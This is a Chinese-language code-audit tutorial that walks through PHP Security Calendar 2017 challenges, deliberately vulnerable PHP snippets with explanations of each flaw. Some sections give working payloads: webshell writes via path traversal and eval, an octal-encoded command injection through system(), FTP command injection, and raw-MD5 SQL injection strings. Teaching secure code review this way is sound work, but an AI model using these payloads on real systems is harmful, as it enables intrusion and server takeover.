# 从 PHP-SECURITY-CALENDAR-2017 入门代码审计

## 1 - Wish List

> in_array

```php
class Challenge {
    const UPLOAD_DIRECTORY = './solutions/';
    private $file;
    private $whitelist;

    public function __construct($file) {
        $this->file = $file;
        $this->whitelist = range(1, 24);
    }

    public function __destruct() {
        if (in_array($this->file['name'], $this->whitelist)) {
            move_uploaded_file(
                $this->file['tmp_name'],
                self::UPLOAD_DIRECTORY . $this->file['name']
            );
        }
    }
}

$challenge = new Challenge($_FILES['solution']);
```

注意到 `move_uploaded_file()` ，估计可以上传任意文件。

```php
move_uploaded_file ( string $filename , string $destination ) : bool
```

这是文件上传中常用的一个函数，文件被上传结束后，默认地被存储在了临时目录中，这时必须将它从临时目录中移动到其它地方，因为脚本执行完后，临时目录里的文件会被删除。所以要在删除之前用 PHP 的 `copy()` 或者 `move_upload_file()`  函数将它复制或者移动到其它位置，到此，才算完成了上传文件过程。

再观察里面的两个参数，如果 `file[‘name’]` 是可控的话，或许可以通过加 `../` 进行目录穿越。

追溯一下源头，在构造函数中可看到，`this->file` 来自  `$_FILES['solution']` 。

此处的 `$_FILES` 是 PHP 中的超级全局变量，该数组包含有所有上传的文件信息，这里可本地做做实验。

### payload

**构造如下表单**

```html
<!doctype html>
<html>
<body>
    <form action="http://localhost/test.php" method="POST" enctype="multipart/form-data">
        <input type="file" name="solution"><br>
        <input type="submit" name="submit" value="Submit">
    </form>
</body>
</html>
```

**test.php**

```php
<?php print_r($_FILES);?>
```

可看到如下结果

```php
Array (
    [solution] => Array (
            [name] => A.png
            [type] => image/png
            [tmp_name] => C:\Windows\php4F0F.tmp
            [error] => 0
            [size] => 40436
        )
)
```

结合上面的代码，`this->file` 是中间的那个数组，`name` 是可控的，即我们上传文件本身的名称。

外面还有一个 `if` 判断

```php
in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool
```

这里其实很好绕过，因为 `in_array()`  没有开启 `strict`，将自动转换类型。

![](http://ww1.sinaimg.cn/large/de75fd55gy1g1bj55nnsgj20j003qt92.jpg)

可惜了，不能进行目录穿越，在实际场景中可能还要结合一些文件包含才能 `getshell`了。



## 2 - Twig

```php
// composer require "twig/twig"
require 'vendor/autoload.php';

class Template {
    private $twig;

    public function __construct() {
        $indexTemplate = '<img ' .
            'src="https://loremflickr.com/320/240">' .
            '<a href="{{link|escape}}">Next slide &raquo;</a>';

        // Default twig setup, simulate loading
        // index.html file from disk
        $loader = new Twig\Loader\ArrayLoader([
            'index.html' => $indexTemplate
        ]);
        $this->twig = new Twig\Environment($loader);
    }

    public function getNexSlideUrl() {
        $nextSlide = $_GET['nextSlide'];
        return filter_var($nextSlide, FILTER_VALIDATE_URL);
    }

    public function render() {
        echo $this->twig->render(
            'index.html',
            ['link' => $this->getNexSlideUrl()]
        );
    }
}

(new Template())->render();
```

`filter_var($nextSlide, FILTER_VALIDATE_URL)`

```php
filter_var ( mixed $variable [, int $filter=FILTER_DEFAULT[, mixed $options ]]) :mixed
```

也就是说，如果 `$nextSlide` 是一个合法的 `URL` ，那么直接返回，否则返回 `false`。

这里涉及到一些 `Twig` 模板的问题，待补充。



## 3 - Snow Flake

```php
function __autoload($className) {
    include $className;
}

$controllerName = $_GET['c'];
$data = $_GET['d'];

if (class_exists($controllerName)) {
    $controller = new $controllerName($data['t'], $data['v']);
    $controller->render();
} else {
    echo 'There is no page with this name';
}

class HomeController {
    private $template;
    private $variables;

    public function __construct($template, $variables) {
        $this->template = $template;
        $this->variables = $variables;
    }

    public function render() {
        if ($this->variables['new']) {
            echo 'controller rendering new response';
        } else {
            echo 'controller rendering old response';
        }
    }
}
```

## 13 - Turkey Baster

```php
class LoginManager {
    private $em;
    private $user;
    private $password;

    public function __construct($user, $password) {
        $this->em = DoctrineManager::getEntityManager();
        $this->user = $user;
        $this->password = $password;
    }

    public function isValid() {
        $user = $this->sanitizeInput($this->user);
        $pass = $this->sanitizeInput($this->password);

        $queryBuilder = $this->em->createQueryBuilder()
            ->select("COUNT(p)")
            ->from("User", "u")
            ->where("user = '$user' AND password = '$pass'");
        $query = $queryBuilder->getQuery();
        return boolval($query->getSingleScalarResult());
    }

    public function sanitizeInput($input, $length = 20) {
        $input = addslashes($input);
        if (strlen($input) > $length) {
            $input = substr($input, 0, $length);
        }
        return $input;
    }
}

$auth = new LoginManager($_POST['user'], $_POST['passwd']);
if (!$auth->isValid()) {
    exit;
}
```

注意到两个参数都被 `addslashes()` 转义，而且将截断。


## 14 - Snowman

> 变量覆盖

```php
class Carrot {
    const EXTERNAL_DIRECTORY = '/tmp/';
    private $id;
    private $lost = 0;
    private $bought = 0;

    public function __construct($input) {
        $this->id = rand(1, 1000);

        foreach ($input as $field => $count) {
            $this->$field = $count++;
        }
    }

    public function __destruct() {
        file_put_contents(
            self::EXTERNAL_DIRECTORY . $this->id,
            var_export(get_object_vars($this), true)
        );
    }
}

$carrot = new Carrot($_GET);
```

这里有一个明显的变量覆盖漏洞，`id` 尽管被赋上了随机数，但实际上还是可控的。

```php
file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) : int
```

> PHP 有个好玩的地方，能传 `$filename` 的地方，基本上可以用 PHP 伪协议流。
>
> 可惜这里的 EXTERNAL_DIRECTORY 不可控，不好用其他技巧了。
>
> 想深入了解可以参考 ph 师傅的这篇文章，[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

`get_object_vars($this)` 没有采取任何过滤，可直接写入 `webshell`。

### payload

```php
id=../../var/www/html/shell.php&t=<?php%20eval($_GET[1])?>

// print_r(var_export(get_object_vars($this), true));   
array (
  'id' => '../../var/www/html/shell.php',
  'lost' => 0,
  'bought' => 0,
  't' => '<?php eval($_GET[1])?>',
)
    
// echo self::EXTERNAL_DIRECTORY . $this->id;
/tmp/../../var/www/html/test/shell.php
```

**变一变**

```php
$this->$field = $count++;  -–>  $this->$field = ++$count;
```

php 有个很有意思的特性：

```php
php > $s = '1';
php > echo ++$s;  // 2
php > $s = 'a';
php > echo ++$s;  // b
php > $s = 'abc';
php > echo ++$s;  // abd
```

这时候只需要稍微改下即可

```
id=../../var/www/html/shell.pho&t=<?php%20eval($_GET[1])?>
```



## 15 - Sleigh Ride

> $_SERVER['PHP_SELF']

```php
class Redirect {
    private $websiteHost = 'www.example.com';

    private function setHeaders($url) {
        $url = urldecode($url);
        header("Location: $url");
    }

    public function startRedirect($params) {
        $parts = explode('/', $_SERVER['PHP_SELF']);
        $baseFile = end($parts);
        $url = sprintf(
            "%s?%s",
            $baseFile,
            http_build_query($params)
        );
        $this->setHeaders($url);
    }
}

if ($_GET['redirect']) {
    (new Redirect())->startRedirect($_GET['params']);
}
```

粗一看，有一个 `Redirect` 的类，很有可能是任意 `URL` 跳转。

**预备知识**

```php
$_SERVER['PHP_SELF']  // 当前执行脚本的文件名
http://example.com/test.php/foo.bar
--> /test.php/foo.bar

explode ( string $delimiter , string $string [, int $limit ] ) : array
<?php
$pizza  = "piece1 piece2 piece3 piece4 piece5 piece6";
$pieces = explode(" ", $pizza);
echo $pieces[0]; // piece1
echo $pieces[1]; // piece2    

end ( array &$array ) : mixed
<?php
$fruits = array('apple', 'banana', 'cranberry');
echo end($fruits); // cranberry

http_build_query ( mixed $query_data [, string $numeric_prefix [, string $arg_separator [, int $enc_type = PHP_QUERY_RFC1738 ]]] ) : string
<?php
$data = array('foo'=>'bar',
              'baz'=>'boom',
              'cow'=>'milk',
              'php'=>'hypertext processor');

echo http_build_query($data) . "\n";
// foo=bar&baz=boom&cow=milk&php=hypertext+processor
echo http_build_query($data, '', '&amp;');    
// myvar_0=foo&myvar_1=bar&myvar_2=baz&myvar_3=boom&cow=milk&php=hypertext+processor
```

其本意应该是实现站内跳转，但是没有过滤，所以造成了漏洞。

此漏洞可被拿来构造钓鱼页面，来进行欺骗；某些依赖 `referer` 校验的安全解决方案也会失效。

例如，如果有提交本站 bug 的窗口，还可以结合一些 `xss` 盲打管理员 `cookie`。

### payload

```php
/target.com?redirect=1&params[abc]=123
URL --> target.com?abc=123  // 仍然在站内跳转，需要添加一个 http://
前面又是用 / 分割的，如果直接加入将失效，注意到 urldecode()，所以这里可用 url 二次编码绕过
//  -->  %2f%2f  --> %25%32%66%25%32%66
最终 payload  --> index.php/http:%252f%252fbaidu.com?redirect=1&params[abc]=123
```



## 16 - Poem

> $_REQUESTS

```php
class FTP {
    public $sock;

    public function __construct($host, $port, $user, $pass) {
        $this->sock = fsockopen($host, $port);  // 返回文件指针，文件操作相关函数都能用

        $this->login($user, $pass);
        $this->cleanInput();
        $this->mode($_REQUEST['mode']);
        $this->send($_FILES['file']);
    }

    private function cleanInput() {
        $_GET = array_map('intval', $_GET);
        $_POST = array_map('intval', $_POST);
        $_COOKIE = array_map('intval', $_COOKIE);
    }

    public function login($username, $password) {
        fwrite($this->sock, "USER " . $username . "\n");
        fwrite($this->sock, "PASS " . $password . "\n");
    }

    public function mode($mode) {
        if ($mode == 1 || $mode == 2 || $mode == 3) {
            fputs($this->sock, "MODE $mode\n");  // fputs 是 fwrite 别名
        }
    }

    public function send($data) {
        fputs($this->sock, $data);
    }
}

new FTP('localhost', 21, 'user', 'password');
```

给的源码是一个 `FTP` 操作类，可能又是文件上传。

不熟悉 `fsockopen` 的，可以看看 [php fsockopen使用方法和实例讲解](http://www.manongjc.com/article/1463.html)

```php
// 为数组每一个元素都应用回调函数，类似 map()
array_map ( callable $callback , array $array1 [, array $... ] ) : array
```

这用到了一个很有意思的超级全局变量—— `$_REQUEST`，开发过程中尽量不要用，我们先看下手册。

> 默认情况下包含了 [$_GET](http://php.net/manual/zh/reserved.variables.get.php)，[$_POST](http://php.net/manual/zh/reserved.variables.post.php) 和 [$_COOKIE](http://php.net/manual/zh/reserved.variables.cookies.php) 的数组。
>
> 由于 $_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件，因此可以被远程用户篡改而并不可信。这个数组的项目及其顺序依赖于 PHP 的 [variables_order](http://php.net/manual/zh/ini.core.php#ini.variables-order) 指令的配置。

为什么会说不可信呢？`$_REQUEST` 是直接从 `GET, POST, COOKIE` 中取值，而不是引用。也就是说，即使`GET, POST, COOKIE` 的值在后续发生了变化，也不会影响到 `$_REQUEST` 中的值，相当于复制了一份最初的值。

而上面的 `cleanInput()` 只是将 `GET, POST, COOKIE` 处理了一下，但是  `$_REQUEST` 依然不会受影响。

**做个小实验**

```php
<?php
$_GET = array_map('intval', $_GET);  

// ?hhh=123test 结果如下
print_r($_GET);
print_r($_REQUEST);
/*
Array (
    [hhh] => 123
)
Array (
    [hhh] => 123test
)
*/
```

还有一个小点，这里用的是 `==` ，会自动进行类型转换，所以轻松绕过，安全编码问题。

`fwrite()` 能不能进行文件写入？`ftp` 协议还能进行哪些骚操作？

带着这两个问题再做做实验，不过这遇到了一个新问题。

```php
fwrite ( resource $handle , string $string [, int $length ] ) : int
fputs($this->sock, $data);  
// 传入的 $data 应该为 string 类型，但这里传的是数组，能行？
// 经过实验，传数组进去的后果就是什么也写不进去，感兴趣的同学可以自己试试。
// 所以传入的 $_FILES['file'] 本意是啥？
// 另外 ftp mode 有 1、2、3？
```

先开启 `nc` 进行监听

```shell
nc -l -p 8080 -vvvk
```

上面的 `$_FILES['file']` 没多大意义，传不过去，所以表单也省了，直接在浏览器发起请求。

![](http://ww1.sinaimg.cn/large/de75fd55gy1g1bj3upo1vj20ms08t74v.jpg)

可以看到 `mode` 那成功绕过，但是绕过了又能干啥呢？

答案是任意 `ftp` 指令执行，只需要加个 `%0a` 换行和 `%0d` 回车即可实现命令（ftp）注入。

### payload

我们先来看看 `ftp` 常用指令 [ftp协议指令集](https://blog.csdn.net/weiyuefei/article/details/51758288)  [ftp协议详解](https://www.cnblogs.com/duanxz/p/5129153.html)

```
!               cr              macdef          proxy           send
$               delete          mdelete         sendport        status
account         debug           mdir            put             struct
append          dir             mget            pwd             sunique
ascii           disconnect      mkdir           quit            tenex
bell            form            mls             quote           trace
binary          get             mode            recv            type
bye             glob            mput            remotehelp      user
case            hash            nmap            rename          verbose
cd              help            ntrans          reset           ?
cdup            lcd             open            rmdir
close           ls              prompt          runique
```

可惜的是没有回显，不能进行下载了，其他的文件处理都能执行。

去看看官方 `wp` 对 `send()` 有何解释，没想到只是简单的讲了可以进行任意文件删除。

最终类似的 payload 为：`1%0a%0dDELETE%20test`，其中的 `DELETE` 可替换为其他指令。



## 17 - Mistletoe

> md5

```php
class RealSecureLoginManager {
    private $em;
    private $user;
    private $password;

    public function __construct($user, $password) {
        $this->em = DoctrineManager::getEntityManager();
        $this->user = $user;
        $this->password = $password;
    }

    public function isValid() {
        $pass = md5($this->password, true);
        $user = $this->sanitizeInput($this->user);

        $queryBuilder = $this->em->createQueryBuilder()
                        ->select("COUNT(p)")
                        ->from("User", "u")
                        ->where("password = '$pass' AND user = '$user'");
        $query = $queryBuilder->getQuery();
        return boolval($query->getSingleScalarResult());
    }

    public function sanitizeInput($input) {
        return addslashes($input);
    }
}

$auth = new RealSecureLoginManager(
    $_POST['user'],
    $_POST['passwd']
);

if (!$auth->isValid()) {
    exit;
}
```

有 `sql` 语句，极有可能是注入题， `user` 被转义，注意到 `md5($this->passwd, true)` ，想起了一个 [注入题](http://web.jarvisoj.com:32772/)。

```php
md5 ( string $str [, bool $raw_output = FALSE ] ) : string
raw 为 TRUE 时为 16 字符二进制格式，默认为 32 字符十六进制数
```

### payload

> hint: "select * from admin where password='".md5($pass,true)."'"
>
>
> 参考 https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html
>
> ​         http://www.am0s.com/functions/204.html
>
> 有个牛逼的字符串： ffifdyop，传入之后，最终的 sql 语句变为 
>
> select * from admin where password=''or'6�]��!r,��b' 成功闭合，得到万能密码

这还有一个有趣的数字——`128`

```shell
➜  ~ php -r "var_dump(md5(128, true));"
string(16) "v�an���l���q��\"
```

可以看到末尾出现了一个 `\` ，将把 `‘` 吃掉，再结合一下 `user= or 1#`

最终将形成这样的语句

```sql
where password='v�an���l���q��\' AND user = ' or 1#
```



## 18 - Sign

> openssl_verify

```php
class JWT {
    public function verifyToken($data, $signature) {
        $pub = openssl_pkey_get_public("file://pub_key.pem");
        $signature = base64_decode($signature);
        if (openssl_verify($data, $signature, $pub)) {
            $object = json_decode(base64_decode($data));
            $this->loginAsUser($object);
        }
    }
}

(new JWT())->verifyToken($_GET['d'], $_GET['s']);
```

又是登录验证，先看一下这两个函数

```php
openssl_pkey_get_public ( mixed $certificate ) : resource
// 从 certificate 中解析公钥，供其他函数使用
    
openssl_verify ( string $data , string $signature , mixed $pub_key_id [, mixed $signature_alg = OPENSSL_ALGO_SHA1 ] ) : int
// 使用与 pub_key_id 关联的公钥验证指定数据 data 的签名 signature 是否正确
```

一个好好的公钥验证函数会有什么漏洞呢？先看另一个很有意思的点。

```php
if (1) {
 	echo 'hhh<br>';   
}
if (-1) {
    echo 'jjj';
}
// 输出结果：hhh jjj 都有
// 有人可能以为大于 0 才能过 if，然而非 0 即可
```

手册上面的解释

![](http://ww1.sinaimg.cn/large/de75fd55gy1g1btq7d85ej20nj0hxt9y.jpg)

再回到 `openssl_verify()` 

> 如果签名正确返回 1, 签名错误返回 0, 内部发生错误则返回-1

所以这里只要构造出内部错误，自然就登录成功了。

### payload

想让它出错也比较简单，只需用一个其他的 `pub_key.pem` 来生成 `data` 和 `signature`。



## 19 - Birch

> stripcslashes

```php
class ImageViewer {
    private $file;

    function __construct($file) {
        $this->file = "images/$file";
        $this->createThumbnail();
    }

    function createThumbnail() {
        $e = stripcslashes(
            preg_replace(
                '/[^0-9\\\]/',
                '',
                isset($_GET['size']) ? $_GET['size'] : '25'
            )
        );
        system("/usr/bin/convert $this->file --resize $e ./thumbs/$this->file");
    }

    function __toString() {
        return "<a href=$this->file> <img src=./thumbs/$this->file></a>";
    }
}

echo (new ImageViewer("image.png"));
```

是一个生成缩略图的类，`system()` 或许可以命令注入，`__toString()` 可能有 `xss`。

可惜 `file` 不可控，那我们仔细看看 `size` ，这有个特别的函数

```php
stripcslashes ( string $str ) : string
// 返回反转义后的字符串。可识别类似 C 语言的 \n，\r，... 八进制以及十六进制的描述。
```

`/[^0-9\\\]/` 只能有数字、反斜杠和右中括号，上面那函数能识别十六进制，

但十六进制中包含字母，所以我们可以把字符串转成八进制试试。

```php
var_dump(stripcslashes('\145\143\150\157\40\47\74\77\160\150\160\40\145\166\141\154\50\44\137\107\105\124\133\61\135\51\73\77\76\47\40\76\40\163\150\145\154\154\56\160\150\160'));
// string(42) "echo '<?php eval($_GET[1]);?>' > shell.php"
// 字符串直接转八进制不太好转，可以先转成URL，然后转成十进制，再转八进制
```

另外，`system()` 里可以执行多条命令，用 `;` 分隔一下即可。

尝试写一个 `webshell` ，也可以直接反弹一个 `shell`。

`stripcslashes()` 这函数难道不是多次一举，限制只能传入数字不就好了？为了兼容不同进制吗？

### payload

```
size=0\073\145\143\150\157\40\47\74\77\160\150\160\40\145\166\141\154\50\44\137\107\105\124\133\61\135\51\73\77\76\47\40\76\40\163\150\145\154\154\56\160\150\160\073
```

最终执行的命令

```shell
/usr/bin/convert images/image.png --resize 0;echo '<?php eval($_GET[1]);?>' > shell.php;
```

写入成功

![](http://ww1.sinaimg.cn/large/de75fd55gy1g1bxcudmt2j20r30fc0u1.jpg)

### 20 - Stocking

```php
set_error_handler(function ($no, $str, $file, $line) {
    throw new ErrorException($str, 0, $no, $file, $line);
}, E_ALL);

class ImageLoader {
    public function getResult($uri) {
        if (!filter_var($uri, FILTER_VALIDATE_URL)) {
            return '<p>Please enter valid uri</p>';
        }

        try {
            $image = file_get_contents($uri);
            $path = "./images/" . uniqid() . '.jpg';
            file_put_contents($path, $image);
            if (mime_content_type($path) !== 'image/jpeg') {
                unlink($path);
                return '<p>Only .jpg files allowed</p>';
            }
        } catch (Exception $e) {
            return '<p>There was an error: ' .
                $e->getMessage() . '</p>';
        }

        return '<img src="' . $path . '" width="100"/>';
    }
}

echo (new ImageLoader())->getResult($_GET['img']);
```

先看看开头这个设置

```php
set_error_handler ( callable $error_handler [, int $error_types = E_ALL | E_STRICT ] ) : mixed
// 设置用户的函数 (error_handler) 来处理脚本中出现的错误。
// 本函数可以用你自己定义的方式来处理运行中的错误， 例如，在应用程序中严重错误发生时，或者在特定条件下触发了一个错误(使用 trigger_error())，你需要对数据/文件做清理回收。
```

这里还特意设置了 `E_ALL` ，也就是说所有的错误都会显示出来，将错误信息全暴露出来是一个极其不明智的选择，这些报错对正常用户没有任何意义，反而会给攻击者提供更多的信息。

不仅仅是 SSRF ，肯定有更好玩的，先放一下。



## 21 - Gift Wrap

```php
declare(strict_types=1);

class ParamExtractor {
    private $validIndices = [];

    private function indices($input) {
        $validate = function (int $value, $key) {
            if ($value > 0) {
                $this->validIndices[] = $key;
            }
        };

        try {
            array_walk($input, $validate, 0);
        } catch (TypeError $error) {
            echo "Only numbers are allowed as input";
        }

        return $this->validIndices;
    }

    public function getCommand($parameters) {
        $indices = $this->indices($parameters);
        $params = [];
        foreach ($indices as $index) {
            $params[] = $parameters[$index];
        }
        return implode($params, ' ');
    }
}

$cmd = (new ParamExtractor())->getCommand($_GET['p']);
system('resizeImg image.png ' . $cmd);
```
